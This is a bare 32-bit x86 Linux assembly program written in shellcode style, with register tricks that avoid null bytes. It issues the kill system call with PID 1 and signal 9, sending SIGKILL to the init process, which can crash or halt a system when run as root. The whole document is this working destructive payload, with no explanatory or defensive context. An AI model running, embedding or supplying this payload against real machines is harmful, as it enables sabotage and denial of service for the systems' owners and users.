global _start 
section .text

_start:
xor eax, eax
mov al, 0x25
mov ebx, eax
mov bl, 0x1
mov ecx, eax
mov cl, 0x9

int 0x80

